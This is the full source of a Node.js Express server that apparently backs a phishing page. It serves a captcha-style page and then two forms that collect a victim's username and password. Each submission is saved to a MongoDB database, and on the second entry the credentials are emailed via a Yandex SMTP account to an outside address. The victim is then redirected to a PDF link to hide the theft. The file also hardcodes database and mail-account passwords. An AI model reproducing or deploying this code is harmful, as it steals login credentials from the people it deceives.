let express = require("express");
let bodyParser = require("body-parser");
let ejs = require("ejs");
let mongoose = require("mongoose");
let https = require('https');
let app = express();
let nodemailer = require('nodemailer');

app.set("view engine", "ejs")
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

mongoose.set('strictQuery', true);
mongoose.connect("mongodb+srv://mstella1759:Badhtguy1.@cluster0.h6tw3.mongodb.net/autograb",{ useNewUrlParser:true });

const userSchema = new mongoose.Schema({
  hidden: String,
  password: String,
});
const User = new mongoose.model("User", userSchema);


app.get("/", function(req, res) {
  username = req.query.username;
  res.render("recap");
});

app.post("/", function(req, res) {
  var username = req.body.recapstore;
  res.render("second",{username: username});
});

// app.post("/first", function(req, res) {
//   var username = req.body.username;
//   res.render("second", {username: username});
// });



app.post("/second", function(req, res) {
  var username = req.body.username;
  const newUser = new User({
    hidden: req.body.username,
    password: req.body.pass
  });
  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {
      res.render("third", {
        username: username
      });
    }
  });
});


app.post("/third", function(req, res) {
  var username = req.body.username;
  const newUser = new User({
    hidden: req.body.username,
    password: req.body.pass,
  });
  newUser.save(function(err) {
    if (err) {
      console.log(err);
    } else {
      // create a transporter object to connect to the SMTP server
      let transporter = nodemailer.createTransport({
        host: "smtp.yandex.com",
        port: 465,
        secure: true,
        auth: {
          user: 'kdavis1759@yandex.com',
          pass: 'Badhtguy2.'
        }
      });

      // define the email options
      let mailOptions = {
        from: 'd_f_simms@hotmail.com',
        to: 'kdavis1759@gmail.com',
        subject: 'New Form Submission',
        text: `username: ${username}, password: ${req.body.pass}`
      };

      // send the email
      transporter.sendMail(mailOptions, function(error, info) {
        if (error) {
          console.log(error);
        } else {
          console.log('Email sent: ' + info.response);
        }
      });

      // redirect to the specified URL
      res.redirect("https://pdf.ac/r2RC5")
    }
  });
});



let port = process.env.PORT;
if (port == null || port == "") {
  port = 3000
};

app.listen(process.env.PORT || 3000, function() {
  console.log("welcome to 3k")
});
